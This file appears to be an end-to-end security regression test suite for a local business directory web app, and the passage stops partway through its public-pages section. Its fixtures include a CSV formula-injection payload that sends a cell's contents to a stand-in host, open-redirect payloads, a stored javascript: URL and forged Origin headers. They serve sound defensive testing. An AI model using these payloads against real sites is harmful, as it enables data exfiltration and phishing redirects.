/**
 * Security / integrity regression suite for the hardening pass.
 *
 *   npm run db:start                       # terminal 1
 *   npm run db:reset                       # fresh database (this suite expects a clean one)
 *   npm run dev:local                      # terminal 2 (or the production preview, see below)
 *   npm run e2e:security
 *
 * It talks to a RUNNING server over HTTP (plus a real Chromium for the CSP checks) and to the local
 * database through `pg`, exactly like the other e2e-*.mjs suites. Against the production build:
 *   npm run build
 *   AUTH_SECRET=test-secret DATABASE_URL=… DIRECT_URL=… PORT=4322 npm run preview
 *   BASE_URL=http://localhost:4322 npm run e2e:security
 * Every check creates its own data (nothing depends on the bundled sample listings), so it passes
 * with or without SHOW_SAMPLE_CONTENT, in dev and in production mode.
 *
 * Each section pins a defect that was found in the code; the comment above it says which.
 */
import { createHash } from 'node:crypto';
import { readFileSync } from 'node:fs';
import { chromium } from 'playwright';
import pg from 'pg';

const BASE = (process.env.BASE_URL ?? 'http://localhost:4321').replace(/\/$/, '');
const DB_URL = process.env.TEST_DATABASE_URL ?? 'postgres://crosslinkd:cl_local_dev@127.0.0.1:5433/crosslinkd';

const results = [];
const check = (name, cond, detail = '') => {
  results.push(`${cond ? 'PASS' : 'FAIL'}  ${name}${detail !== '' && detail !== undefined ? `  [${detail}]` : ''}`);
  return cond;
};
const section = (title) => results.push(`\n--- ${title}`);

const db = new pg.Client({ connectionString: DB_URL });
await db.connect();
const q = (text, params) => db.query(text, params);
const sha = (raw) => createHash('sha256').update(raw).digest('hex');

// ------------------------------------------------------------------ helpers

const stamp = Date.now().toString(36);
let counter = 0;
const uniq = (label) => `${label}-${stamp}-${++counter}`;
const person = (label) => ({ email: `${label}-${stamp}@test.dev`, password: 'Passw0rd!123', name: `${label} User` });

// Each run gets its own client IP (honoured by `astro dev`; the platform overrides it in production), so
// repeated runs against one long-lived dev server do not trip each other's per-IP limits.
const RUN_IP = `203.0.113.${1 + Math.floor(Math.random() * 250)}`;

async function http(path, { method = 'GET', cookie, form, json, headers = {} } = {}) {
  const init = { method, redirect: 'manual', headers: { 'x-forwarded-for': RUN_IP, ...headers } };
  if (cookie) init.headers.cookie = cookie;
  if (form) {
    init.headers['content-type'] = 'application/x-www-form-urlencoded';
    init.body = new URLSearchParams(form).toString();
  }
  if (json !== undefined) {
    init.headers['content-type'] = 'application/json';
    init.body = JSON.stringify(json);
  }
  return fetch(`${BASE}${path}`, init);
}
const location = (res) => res.headers.get('location') ?? '';
const sessionOf = (res) => (res.headers.getSetCookie?.() ?? []).map((c) => c.split(';')[0]).find((c) => c.startsWith('cl_session=')) ?? null;

async function signup(user) {
  const res = await http('/api/auth/signup', { method: 'POST', form: { email: user.email, password: user.password, displayName: user.name } });
  const cookie = sessionOf(res);
  if (!cookie) throw new Error(`signup failed for ${user.email}: ${res.status} ${location(res)}`);
  const { rows } = await q('select id from users where email = $1', [user.email]);
  return { ...user, cookie, id: rows[0].id };
}
const setRole = (email, role) => q('update users set role = $2 where email = $1', [email, role]); // deliberately NO watermark bump

const listingBody = (over = {}) => ({
  name: uniq('Listing'),
  typeSlug: 'business',
  description: 'A description that is comfortably longer than thirty characters.',
  city: 'Saint Clair',
  region: 'MO',
  email: 'owner@test.dev',
  showEmail: true,
  ...over,
});
async function createListing(user, over = {}) {
  const res = await http('/api/submissions', { method: 'POST', cookie: user.cookie, json: { action: 'publish', listing: listingBody(over) } });
  const body = await res.json();
  if (!body.ok) throw new Error(`createListing failed: ${res.status} ${JSON.stringify(body)}`);
  return body.listing; // { id, slug, status }
}
const moderate = (admin, id, action, note) =>
  http(`/api/admin/listings/${id}/moderate`, { method: 'POST', cookie: admin.cookie, json: { action, note } });
const row = async (id) => (await q('select status, published_at, deleted_at, review_count, avg_rating from listings where id = $1', [id])).rows[0];

let reviewedListingId = null; // set by section D, reused by the cron check

// -------------------------------------------------------------------- setup

const owner = await signup(person('owner'));
const other = await signup(person('other'));
const reviewer = await signup(person('reviewer'));
const admin = await signup(person('admin'));
await setRole(admin.email, 'super_admin'); // the existing session becomes admin at once: the DB is authoritative

// ============================================================================
section('A. Broken access control (the C5 IDOR route, exports, malformed ids)');
// ============================================================================
{
  const victim = await createListing(owner, { name: uniq('Victim Bakery') });
  const r1 = await http('/api/listings/update', { method: 'POST', cookie: other.cookie, form: { id: victim.id, name: 'HACKED', description: 'pwned' } });
  check('POST /api/listings/update is gone (was: any member could overwrite any listing)', r1.status === 404, `status=${r1.status}`);
  check('victim listing untouched', (await q('select name from listings where id = $1', [victim.id])).rows[0].name.startsWith('Victim Bakery'));
  check('POST /api/listings/deactivate is gone', (await http('/api/listings/deactivate', { method: 'POST', cookie: other.cookie, form: { id: victim.id } })).status === 404);
  check('POST /api/verifications is gone (stub that logged uploads)', (await http('/api/verifications', { method: 'POST', cookie: other.cookie, form: { type: 'x' } })).status === 404);
  const c = await http('/api/listings/deactivate', { method: 'POST', cookie: other.cookie, form: { id: victim.id } });
  check('no success redirect from removed stubs', !location(c).includes('saved=1'));

  // other member cannot PATCH / DELETE someone else's listing
  const p = await http(`/api/listings/${victim.id}`, { method: 'PATCH', cookie: other.cookie, json: { listing: { name: 'HACKED', typeSlug: 'business' } } });
  check('cross-user PATCH → 404', p.status === 404, `status=${p.status}`);
  const d = await http(`/api/listings/${victim.id}`, { method: 'DELETE', cookie: other.cookie });
  check('cross-user DELETE → 404', d.status === 404, `status=${d.status}`);

  // admin export: was guarded only when NODE_ENV=production && DATABASE_URL (public with POSTGRES_URL or in any non-production build)
  const anon = await http('/api/admin/export?table=listings');
  check('admin export: anonymous → 401', anon.status === 401, `status=${anon.status}`);
  const member = await http('/api/admin/export?table=listings', { cookie: other.cookie });
  check('admin export: member → 403', member.status === 403, `status=${member.status}`);
  const tax = await http('/api/admin/export?table=taxonomy');
  check('admin taxonomy export: anonymous → 401', tax.status === 401, `status=${tax.status}`);
  const okAdmin = await http('/api/admin/export?table=listings', { cookie: admin.cookie });
  check('admin export: admin → 200 csv', okAdmin.status === 200 && (okAdmin.headers.get('content-type') ?? '').startsWith('text/csv'), `status=${okAdmin.status}`);
  check('admin export rejects unknown table', (await http('/api/admin/export?table=users', { cookie: admin.cookie })).status === 400);

  // CSV formula injection
  const evilName = '=HYPERLINK("http://evil.test/?x="&A1,"click")';
  await createListing(owner, { name: evilName });
  const csvBytes = new Uint8Array(await (await http('/api/admin/export?table=listings', { cookie: admin.cookie })).arrayBuffer());
  const csv = new TextDecoder('utf-8', { ignoreBOM: true }).decode(csvBytes); // keep the BOM (fetch().text() would strip it)
  check('admin export neutralises a formula in a listing name', csv.includes(`"'=HYPERLINK(`) && !csv.includes(`,"=HYPERLINK(`), '');
  check('admin export starts with a UTF-8 BOM (Excel) and has a status column', csvBytes[0] === 0xef && csvBytes[1] === 0xbb && csvBytes[2] === 0xbf && csv.split('\r\n')[0].includes('"status"'));

  // owner export: was a public stub returning the demo listings
  const eAnon = await http('/api/listings/export');
  check('own-listings export: anonymous → 401 (was: 200 with demo data)', eAnon.status === 401, `status=${eAnon.status}`);
  const eOwn = await (await http('/api/listings/export', { cookie: owner.cookie })).text();
  check('own-listings export contains my listings', eOwn.includes('Victim Bakery') && eOwn.includes(`"'=HYPERLINK(`));
  const eOther = await (await http('/api/listings/export', { cookie: other.cookie })).text();
  check("own-listings export does not leak other members' listings", !eOther.includes('Victim Bakery'));

  // malformed ids used to throw inside Postgres → 500 page
  const bad = 'not-a-uuid';
  check('PATCH /api/listings/<junk> → 404', (await http(`/api/listings/${bad}`, { method: 'PATCH', cookie: owner.cookie, json: { listing: { name: 'Zz', typeSlug: 'business' } } })).status === 404);
  check('moderate <junk> → 404', (await moderate(admin, bad, 'approve')).status === 404);
  check('review moderation <junk> → 404', (await http(`/api/admin/reviews/${bad}`, { method: 'POST', cookie: admin.cookie, json: { action: 'publish' } })).status === 404);
  check('role change <junk> → 404', (await http(`/api/admin/users/${bad}/role`, { method: 'POST', cookie: admin.cookie, json: { role: 'member' } })).status === 404);
  check('role change: member cannot', (await http(`/api/admin/users/${other.id}/role`, { method: 'POST', cookie: owner.cookie, json: { role: 'super_admin' } })).status === 403);
  check('role change: cannot change own role', (await http(`/api/admin/users/${admin.id}/role`, { method: 'POST', cookie: admin.cookie, json: { role: 'member' } })).status === 409);
}

// ============================================================================
section('B. Moderation cannot be bypassed by editing (PATCH defaults to "publish")');
// ============================================================================
{
  const L = await createListing(owner, { name: uniq('Moderated') });
  const patch = (action, extra = {}) =>
    http(`/api/listings/${L.id}`, { method: 'PATCH', cookie: owner.cookie, json: { ...(action ? { action } : {}), listing: { name: L.slug.replace(/-/g, ' ').slice(0, 40) + ' x', typeSlug: 'business', description: 'Edited description that is long enough to pass.', ...extra } } });

  await moderate(admin, L.id, 'reject', 'Not a fit for the directory.');
  check('admin rejection applied', (await row(L.id)).status === 'rejected');
  const r = await patch(undefined);
  const rb = await r.json();
  check('owner PATCH (default action) cannot re-publish a rejected listing', (await row(L.id)).status === 'rejected' && rb.listing?.status === 'rejected', rb.listing?.status);
  const r2 = await patch('save');
  check('owner PATCH action=save cannot either', (await row(L.id)).status === 'rejected', (await r2.json()).listing?.status);

  await moderate(admin, L.id, 'request_changes', 'Please add hours.');
  await patch(undefined);
  check('changes_requested is also held', (await row(L.id)).status === 'changes_requested');

  await patch('resubmit');
  check('explicit resubmit enters moderation', (await row(L.id)).status === 'pending_review');
  await patch(undefined);
  check('pending listing cannot self-approve', (await row(L.id)).status === 'pending_review');
  check('rejected/held listings are not publicly searchable', !(await (await http(`/api/search?q=${encodeURIComponent(L.slug.split('-')[0])}`)).text()).includes(L.slug));

  await moderate(admin, L.id, 'approve');
  const afterApprove = await row(L.id);
  check('admin approval publishes and stamps published_at', afterApprove.status === 'published' && !!afterApprove.published_at);
  await new Promise((resolve) => setTimeout(resolve, 1100));
  await patch(undefined, { tagline: 'An edit on a live listing' });
  const afterEdit = await row(L.id);
  check('editing a live listing keeps it published', afterEdit.status === 'published');
  check('editing does not reset published_at (was: bumped to "newest" on every edit)', +afterEdit.published_at === +afterApprove.published_at, `${afterApprove.published_at?.toISOString()} → ${afterEdit.published_at?.toISOString()}`);

  // staff-locked: owner cannot edit an archived (deleted) listing at all
  await moderate(admin, L.id, 'delete');
  const del = await patch(undefined);
  check('archived listing cannot be edited', del.status === 409, `status=${del.status}`);
  check('moderation left an audit trail', Number((await q("select count(*)::int as n from audit_logs where target_id = $1", [L.id])).rows[0].n) >= 4);
  check('moderation wrote moderation_actions rows', Number((await q("select count(*)::int as n from moderation_actions where target_id = $1", [L.id])).rows[0].n) >= 4);
}

// ============================================================================
section('C. Editing keeps coordinates and extra locations (was: delete-all + re-insert)');
// ============================================================================
{
  const L = await createListing(owner, { name: uniq('Located'), city: 'Saint Clair', region: 'MO', postalCode: '63077' });
  await q("update listing_locations set latitude = 38.3456, longitude = -90.9809 where listing_id = $1 and is_primary", [L.id]);
  await q("insert into listing_locations (listing_id, label, city, region, is_primary) values ($1, 'Second site', 'Sullivan', 'MO', false)", [L.id]);
  const edit = (listing) => http(`/api/listings/${L.id}`, { method: 'PATCH', cookie: owner.cookie, json: { listing: { name: 'Located edit', typeSlug: 'business', ...listing } } });

  await edit({ tagline: 'same place, new tagline' });
  let loc = (await q('select latitude, longitude, is_primary from listing_locations where listing_id = $1 order by is_primary desc', [L.id])).rows;
  check('coordinates survive an edit that does not move the listing', Number(loc[0].latitude) === 38.3456 && Number(loc[0].longitude) === -90.9809, JSON.stringify(loc[0]));
  check('additional (non-primary) locations survive an edit', loc.length === 2, `rows=${loc.length}`);

  await edit({ city: 'Washington', region: 'MO' });
  loc = (await q('select city, latitude, longitude from listing_locations where listing_id = $1 and is_primary', [L.id])).rows[0];
  check('moving the listing updates the place and clears stale coordinates', loc.city === 'Washington' && loc.latitude === null && loc.longitude === null, JSON.stringify(loc));
  check('exactly one primary location row', Number((await q('select count(*)::int as n from listing_locations where listing_id = $1 and is_primary', [L.id])).rows[0].n) === 1);
}

// ============================================================================
section('D. Reviews work end to end (submit → feedback → moderate → public → owner response)');
// ============================================================================
{
  const L = await createListing(owner, { name: uniq('Reviewable'), city: 'St. Louis', region: 'MO' });
  const slug = L.slug;
  reviewedListingId = L.id;
  const review = (form, cookie = reviewer.cookie) => http('/api/reviews', { method: 'POST', cookie, form: { listingId: L.id, rating: '5', title: 'Great service', body: 'Wonderful and friendly people.', ...form } });

  const s1 = await review({});
  check('review: redirects back to the listing (not /search) with an outcome', location(s1) === `/directory/${slug}?review=submitted#reviews`, location(s1));
  check('review stored as pending', (await q("select status from reviews where listing_id = $1", [L.id])).rows[0]?.status === 'pending');
  const page1 = await (await http(`/directory/${slug}?review=submitted`)).text();
  check('listing page tells the visitor it was received', page1.includes('your review was received'));
  check('pending review is not public', !page1.includes('Wonderful and friendly people.'));

  check('second review by the same member → duplicate', location(await review({})).includes('review=duplicate'));
  check("owner cannot review their own listing", location(await review({}, owner.cookie)).includes('review=own-listing'));
  check('links in a review are refused', location(await review({ body: 'see https://spam.example now', title: 'x' }, other.cookie)).includes('review=links-blocked'));
  check('a missing rating is invalid (was: silently 5 stars)', location(await http('/api/reviews', { method: 'POST', cookie: other.cookie, form: { listingId: L.id, title: 'no rating', body: 'body text' } })).includes('review=invalid'));
  check('fractional / out-of-range rating is invalid', location(await review({ rating: '4.5' }, other.cookie)).includes('review=invalid') && location(await review({ rating: '9' }, other.cookie)).includes('review=invalid'));
  check('unknown listing id → back to search, no crash', location(await http('/api/reviews', { method: 'POST', cookie: reviewer.cookie, form: { listingId: '3f2b8c1e-9d4a-4e6b-8a1c-2d3e4f5a6b7c', rating: '5' } })) === '/search');
  check('malformed listing id → back to search, no crash', location(await http('/api/reviews', { method: 'POST', cookie: reviewer.cookie, form: { listingId: 'zzz', rating: '5' } })) === '/search');
  const asJson = await http('/api/reviews', { method: 'POST', cookie: reviewer.cookie, json: { listingId: L.id, rating: 5 } });
  check('JSON body to a form endpoint → redirect, not a 500', asJson.status === 303, `status=${asJson.status}`);
  const unpublished = await createListing(owner, { name: uniq('Hidden') });
  await moderate(admin, unpublished.id, 'reject', 'no');
  const onHidden = await review({ listingId: unpublished.id }, other.cookie);
  check('a review on an unpublished listing is refused', location(onHidden).includes('review=invalid'), location(onHidden));
  check('…and none was stored', Number((await q('select count(*)::int as n from reviews where listing_id = $1', [unpublished.id])).rows[0].n) === 0);

  // moderation
  const { rows: pending } = await q("select id from reviews where listing_id = $1 and status = 'pending'", [L.id]);
  const reviewId = pending[0].id;
  check('members cannot moderate reviews', (await http(`/api/admin/reviews/${reviewId}`, { method: 'POST', cookie: other.cookie, json: { action: 'publish' } })).status === 403);
  const pub = await http(`/api/admin/reviews/${reviewId}`, { method: 'POST', cookie: admin.cookie, json: { action: 'publish' } });
  check('admin publishes the review', pub.status === 200, `status=${pub.status}`);
  const agg = await row(L.id);
  check('listing aggregates updated (count 1, avg 5)', agg.review_count === 1 && Number(agg.avg_rating) === 5, `${agg.review_count}/${agg.avg_rating}`);
  check('publishing twice is a conflict, not a silent 200', (await http(`/api/admin/reviews/${reviewId}`, { method: 'POST', cookie: admin.cookie, json: { action: 'publish' } })).status === 409);

  const page2 = await (await http(`/directory/${slug}`)).text();
  check('approved review now shows on the listing page (was: always empty for DB listings)', page2.includes('Wonderful and friendly people.') && page2.includes('Great service'));
  check('reviewer is shown as first name + initial', page2.includes('reviewer U.') && !page2.includes('reviewer User'));

  // owner response
  const respond = (cookie, form) => http('/api/reviews/respond', { method: 'POST', cookie, form });
  check('respond: anonymous → sign-in', location(await respond(undefined, { reviewId, response: 'Thanks!' })).startsWith('/auth/signin'));
  check('respond: another member cannot answer', location(await respond(other.cookie, { reviewId, response: 'Thanks!' })).includes('error='));
  check('respond: the reviewer cannot answer their own review', location(await respond(reviewer.cookie, { reviewId, response: 'Thanks!' })).includes('error='));
  check('respond: empty / junk id is refused', location(await respond(owner.cookie, { reviewId: 'zzz', response: 'Thanks!' })).includes('error='));
  const ok = await respond(owner.cookie, { reviewId, response: 'Thank you so much for the kind words!' });
  check('owner response saved (was: silently discarded)', location(ok) === '/dashboard/reviews?responded=1', location(ok));
  check('owner response stored', (await q('select owner_response from reviews where id = $1', [reviewId])).rows[0].owner_response === 'Thank you so much for the kind words!');
  const page3 = await (await http(`/directory/${slug}`)).text();
  check('owner response is public on the listing page', page3.includes('Thank you so much for the kind words!'));
  check('one response per review', location(await respond(owner.cookie, { reviewId, response: 'Second try' })).includes('error='));
  const dash = await (await http('/dashboard/reviews?responded=1', { cookie: owner.cookie })).text();
  check('dashboard confirms the saved response', dash.includes('response was saved'));

  // --- admin review queue: the buttons are wired to the API (they used to be alert() stubs)
  await review({ rating: '3', title: 'Decent', body: 'It was fine, nothing special.' }, other.cookie);
  const queueHtml = await (await http('/admin/reviews', { cookie: admin.cookie })).text();
  check('admin queue lists the pending review with real buttons', queueHtml.includes('It was fine, nothing special.') && queueHtml.includes('data-act="publish"') && !/alert\('Review/.test(queueHtml));
  {
    const browser = await chromium.launch();
    try {
      const ctx = await browser.newContext();
      await ctx.addCookies([{ name: 'cl_session', value: admin.cookie.split('=')[1], url: BASE }]);
      const page = await ctx.newPage();
      await page.goto(`${BASE}/admin/reviews`, { waitUntil: 'networkidle' });
      const card = page.locator('[data-review]', { hasText: 'It was fine, nothing special.' });
      await card.locator('button[data-act="publish"]').click();
      await card.locator('[data-status]').filter({ hasText: 'Published' }).waitFor({ timeout: 8000 });
      check('clicking Publish really publishes (UI → API → DB)', (await q("select status from reviews where listing_id = $1 and title = 'Decent'", [L.id])).rows[0]?.status === 'published');
      const a2 = await row(L.id);
      check('aggregates follow: 2 reviews, average 4.00', a2.review_count === 2 && Number(a2.avg_rating) === 4, `${a2.review_count}/${a2.avg_rating}`);
      check('the published review is on the listing page', (await (await http(`/directory/${slug}`)).text()).includes('It was fine, nothing special.'));
      await ctx.close();
    } finally {
      await browser.close();
    }
  }
  // removal hides the review; aggregates are recomputed from what is still published
  const third = await signup(person('third'));
  await review({ rating: '1', title: 'Spam', body: 'Bad faith review.' }, third.cookie);
  const spamId = (await q("select id from reviews where listing_id = $1 and title = 'Spam'", [L.id])).rows[0].id;
  check('admin removes a review', (await http(`/api/admin/reviews/${spamId}`, { method: 'POST', cookie: admin.cookie, json: { action: 'remove' } })).status === 200);
  const spam = (await q('select status, deleted_at from reviews where id = $1', [spamId])).rows[0];
  check('removed review is soft-deleted', spam.status === 'removed' && spam.deleted_at !== null);
  const a3 = await row(L.id);
  check('aggregates unchanged by removing an unpublished review', a3.review_count === 2 && Number(a3.avg_rating) === 4);
  check('removed review is not public', !(await (await http(`/directory/${slug}`)).text()).includes('Bad faith review.'));
}

// ============================================================================
section('E. Sign-in: open redirect, magic link, timing, token revocation, shared rate limit');
// ============================================================================
{
  const signin = (next, over = {}) =>
    http('/api/auth/signin', { method: 'POST', form: { email: owner.email, password: owner.password, next, ...over } });

  check('next=/admin/listings is honoured', location(await signin('/admin/listings')) === '/admin/listings');
  for (const [label, next] of [['//evil', '//evil.example/x'], ['backslash', '/\\evil.example'], ['tab', '/\t/evil.example'], ['absolute', 'https://evil.example/']]) {
    const loc = location(await signin(next));
    check(`open redirect blocked: ${label}`, loc === '/dashboard', loc);
  }
  const wrong = await signin('/admin/listings', { password: 'wrong-password' });
  check('failed sign-in keeps the intended destination', location(wrong).includes('next=%2Fadmin%2Flistings') && location(wrong).includes('error='), location(wrong));
  check('non-form body to sign-in → redirect, not 500', (await http('/api/auth/signin', { method: 'POST', json: { email: 'a@b.co' } })).status === 303);

  // magic link GET honours only same-site next
  const mint = async (user, kind = 'magic', raw = `${kind}-${uniq('tok')}`) => {
    await q("insert into auth_tokens (user_id, kind, token_hash, expires_at) values ($1, $2, $3, now() + interval '1 hour')", [user.id, kind, sha(raw)]);
    return raw;
  };
  const evilToken = await mint(other);
  const m1 = await http(`/api/auth/magic-link?token=${evilToken}&next=${encodeURIComponent('/\\evil.example')}`);
  check('magic link signs in and refuses an off-site next', m1.status === 303 && location(m1) === '/dashboard' && !!sessionOf(m1), location(m1));
  const goodToken = await mint(other);
  check('magic link honours a same-site next', location(await http(`/api/auth/magic-link?token=${goodToken}&next=%2Faccount`)) === '/account');
  check('magic link is single use', location(await http(`/api/auth/magic-link?token=${goodToken}&next=%2Faccount`)).includes('error='));

  // timing: unknown email used to skip bcrypt entirely (≈ms) and answer much faster than a wrong password (≈250 ms)
  const timed = async (email) => { const t = performance.now(); await http('/api/auth/signin', { method: 'POST', form: { email, password: 'Some-wrong-pw-1' } }); return performance.now() - t; };
  const tUnknown = await timed(`nobody-${stamp}@test.dev`);
  const tWrong = await timed(owner.email);
  check('unknown email costs a bcrypt round too (no enumeration by timing)', tUnknown > 100 && tUnknown > tWrong * 0.4, `unknown=${tUnknown.toFixed(0)}ms wrong-pw=${tWrong.toFixed(0)}ms`);

  // password reset must kill the other outstanding links
  const t1 = await mint(reviewer, 'password_reset');
  const t2 = await mint(reviewer, 'password_reset');
  const magicLeft = await mint(reviewer, 'magic');
  const confirm = (token, password = 'New-Passw0rd!456') => http('/api/auth/reset', { method: 'POST', form: { intent: 'confirm', token, password } });
  check('reset with the first token succeeds', location(await confirm(t1)) === '/auth/signin?notice=password-reset');
  check('the second outstanding reset link is dead', location(await confirm(t2)).includes('error='));
  check('an outstanding magic link is dead too', location(await http(`/api/auth/magic-link?token=${magicLeft}`)).includes('error=') && !sessionOf(await http(`/api/auth/magic-link?token=${magicLeft}`)));
  check('old session of the reset user is revoked', (await http('/api/listings/export', { cookie: reviewer.cookie })).status === 401);
  const fresh = await http('/api/auth/signin', { method: 'POST', form: { email: reviewer.email, password: 'New-Passw0rd!456' } });
  check('new password works', !!sessionOf(fresh));
  reviewer.cookie = sessionOf(fresh);

  // the magic-link button on the sign-in page (it used to live in a separate <form> without an email field)
  const browser = await chromium.launch();
  try {
    const ctx = await browser.newContext();
    const page = await ctx.newPage();
    await page.goto(`${BASE}/auth/signin?next=${encodeURIComponent('/account')}`, { waitUntil: 'networkidle' });
    await page.fill('input[name="email"]', other.email);
    await Promise.all([page.waitForURL('**/auth/signin?sent=magic**'), page.click('button:has-text("Email me a magic link")')]);
    check('magic-link button works from the sign-in form', (await page.locator('[role="status"]').first().innerText()).includes('sign-in link'));
    check('…and keeps the next target', new URL(page.url()).searchParams.get('next') === '/account', page.url());
    const minted = await q("select count(*)::int as n from auth_tokens where user_id = $1 and kind = 'magic' and used_at is null", [other.id]);
    check('…and a magic token was issued', Number(minted.rows[0].n) >= 1);
    await page.goto(`${BASE}/auth/signin?next=${encodeURIComponent('//evil.example')}`, { waitUntil: 'networkidle' });
    check('sign-in page does not echo an off-site next into the form', (await page.locator('input[name="next"]').getAttribute('value')) === '/dashboard');
    await ctx.close();
  } finally {
    await browser.close();
  }

  // shared (database) rate limit: 10 sign-ins / 15 min / email; counted in Postgres, not just in this instance's memory
  const target = `throttle-${stamp}@test.dev`;
  let blocked = 0;
  for (let i = 0; i < 12; i++) {
    const res = await http('/api/auth/signin', { method: 'POST', form: { email: target, password: 'Some-wrong-pw-1' } });
    if (decodeURIComponent(location(res)).includes('Too many sign-in attempts')) blocked++;
  }
  check('sign-in is throttled after 10 attempts per email', blocked >= 1, `blocked=${blocked}`);
  const counter = await q("select hits from rate_limits where key = $1", [`signin:email:${target}`]);
  check('the counter lives in Postgres (shared across serverless instances)', counter.rows.length === 1 && Number(counter.rows[0].hits) >= 10, JSON.stringify(counter.rows));
}

// ============================================================================
section('F. CSRF and malformed bodies');
// ============================================================================
{
  const evil = await http('/api/auth/signin', { method: 'POST', form: { email: owner.email, password: owner.password }, headers: { origin: 'https://evil.example' } });
  check('foreign Origin → 403', evil.status === 403, `status=${evil.status}`);
  const nullOrigin = await http('/api/auth/signin', { method: 'POST', form: { email: owner.email, password: owner.password }, headers: { origin: 'null' } });
  check('Origin: null → 403', nullOrigin.status === 403);
  const noOrigin = await http('/api/account/delete', { method: 'POST', cookie: other.cookie, form: { confirm: 'delete' }, headers: { 'sec-fetch-site': 'cross-site' } });
  check('no Origin but Sec-Fetch-Site: cross-site → 403 (was: allowed)', noOrigin.status === 403, `status=${noOrigin.status}`);
  check('the cross-site account deletion did not happen', (await q('select deleted_at from users where id = $1', [other.id])).rows[0].deleted_at === null);
  const same = await http('/api/auth/signin', { method: 'POST', form: { email: owner.email, password: 'nope-nope-1' }, headers: { origin: BASE } });
  check('same-origin POST is processed', same.status === 303 && same.status !== 403);
  for (const path of ['/api/contact', '/api/claims', '/api/feedback', '/api/auth/signup', '/api/auth/reset', '/api/auth/magic-link', '/api/listings']) {
    const res = await http(path, { method: 'POST', json: { hello: 'world' } });
    check(`JSON to ${path} → not a 500`, res.status < 500, `status=${res.status}`);
  }
}

// ============================================================================
section('G. The database decides the role (no 30-day stale admin)');
// ============================================================================
{
  const u = await signup(person('flip'));
  check('fresh member cannot reach the admin export', (await http('/api/admin/export', { cookie: u.cookie })).status === 403);
  await setRole(u.email, 'super_admin');
  check('promoted in SQL (no session bump): same cookie is admin immediately', (await http('/api/admin/export', { cookie: u.cookie })).status === 200);
  await setRole(u.email, 'member');
  check('demoted in SQL (no session bump): same cookie loses admin immediately', (await http('/api/admin/export', { cookie: u.cookie })).status === 403);
  const adminPageAnon = await http('/admin/reviews');
  check('admin pages redirect anonymous visitors to sign-in', adminPageAnon.status === 302 && location(adminPageAnon).startsWith('/auth/signin'));
}

// ============================================================================
section('H. Public pages: real 404s, city slugs, sitemap, safe links, search API');
// ============================================================================
{
  const stl = await createListing(owner, { name: uniq('Gateway Bakery & Cafe'), city: 'St. Louis', region: 'MO', website: 'https://example.com', showWebsite: true });
  const church = await createListing(owner, { name: uniq('Grace Church'), typeSlug: 'church', city: "O'Fallon", region: 'MO' });
  // "Missouri" typed in full must land on the same city page as "MO" (the README promised this; nothing implemented it)
  const desoto = await createListing(owner, { name: uniq('Main Street Hardware'), city: '  DeSoto ', region: 'Missouri' });
  const desotoRow = (await q('select city, region from listing_locations where listing_id = $1 and is_primary', [desoto.id])).rows[0];
  check('region typed as "Missouri" is stored as MO', desotoRow.region === 'MO', JSON.stringify(desotoRow));
  check('city keeps its letter case (DeSoto is not "Desoto"), whitespace tidied', desotoRow.city === 'DeSoto', JSON.stringify(desotoRow));
  const desotoPage = await http('/locations/desoto-mo');
  check('…so the listing is on the /locations/desoto-mo page', desotoPage.status === 200 && (await desotoPage.text()).includes(desoto.slug));

  const missing = await http('/directory/this-listing-does-not-exist-anywhere');
  check('unknown listing → 404 (was: 302 to /search, a soft-404)', missing.status === 404, `status=${missing.status}`);
  check('the 404 page is the branded one', (await missing.text()).includes('That page is not here'));
  const missingCity = await http('/locations/nowhere-zz');
  check('unknown city page → 404 (was: 302)', missingCity.status === 404, `status=${missingCity.status}`);
  for (const path of ['/denominations/nope', '/industries/nope', '/professions/nope', '/states/nope', '/articles/nope', '/events/nope']) {
    const res = await http(path);
    check(`unknown ${path.split('/')[1]} page → 404 (was: 302 to the index)`, res.status === 404, `status=${res.status}`);
  }
  check('known taxonomy pages still render', (await http('/browse/industries')).status === 200 && (await http('/states/texas')).status === 200);

  const page = await (await http(`/directory/${stl.slug}`)).text();
  check('breadcrumb links to /locations/st-louis-mo (was st.-louis-mo → dead page)', page.includes('href="/locations/st-louis-mo"'));
  const cityPage = await http('/locations/st-louis-mo');
  check('…and that city page exists and lists the listing', cityPage.status === 200 && (await cityPage.text()).includes(stl.slug));
  const cityPage2 = await http('/locations/o-fallon-mo');
  check("apostrophes in city names work too (O'Fallon)", cityPage2.status === 200 && (await cityPage2.text()).includes(church.slug));
  check('website link is rendered for a valid http(s) URL', page.includes('href="https://example.com/"'));

  // stored javascript: URL must never reach an href (validation blocks it on input, but legacy rows / SQL edits exist)
  await q("update listings set website = 'javascript:alert(document.domain)' where id = $1", [stl.id]);
  const hostile = await (await http(`/directory/${stl.slug}`)).text();
  check('a stored javascript: website is not rendered as a link', !/href="javascript:/i.test(hostile));

  const sitemap = await http('/sitemap.xml');
  const xml = await sitemap.text();
  check('sitemap is served as XML', sitemap.status === 200 && (sitemap.headers.get('content-type') ?? '').includes('xml'));
  check('sitemap includes the home page (was dropped by filter(Boolean))', /<loc>https?:\/\/[^<\/]+\/<\/loc>/.test(xml));
  check('sitemap uses the city-page slug rule', xml.includes('/locations/st-louis-mo') && xml.includes('/locations/o-fallon-mo') && !xml.includes('st.-louis'));
  check('sitemap lists the new listings with lastmod', xml.includes(`/directory/${stl.slug}`) && /<lastmod>\d{4}-\d{2}-\d{2}T/.test(xml));
  check('sitemap is well-formed (no raw & or unescaped text)', !/&(?!amp;|lt;|gt;|quot;|apos;)/.test(xml));
  const robots = await (await http('/robots.txt')).text();
  check('robots.txt is the dynamic route (public/robots.txt no longer shadows it)', robots.includes('Sitemap: http') && robots.includes('Disallow: /api/'));

  // the JSON search API honours filters in every mode (the Postgres path used to ignore everything but q)
  const onlyChurch = await (await http(`/api/search?type=church&perPage=50`)).json();
  const slugs = (onlyChurch.hits ?? []).map((h) => h.slug);
  check('/api/search?type=church returns the church and not the bakery', slugs.includes(church.slug) && !slugs.includes(stl.slug), `hits=${slugs.length}`);
  const clamped = await (await http('/api/search?perPage=999999&page=-5&minRating=abc')).json();
  check('/api/search clamps hostile paging', clamped.perPage === 50 && clamped.page === 1, `perPage=${clamped.perPage} page=${clamped.page}`);

  // favorites: targeted lookup, bounded id list
  const fav = await (await http(`/api/favorites?ids=${encodeURIComponent(`db-${church.id},${stl.slug},not-real`)}`)).json();
  const favSlugs = (fav.listings ?? []).map((l) => l.slug).sort();
  check('favorites resolves db ids and slugs with one lookup', favSlugs.includes(church.slug) && favSlugs.includes(stl.slug), favSlugs.join(','));
  check('favorites ignores unknown references', !favSlugs.includes('not-real') && favSlugs.length === 2, String(favSlugs.length));
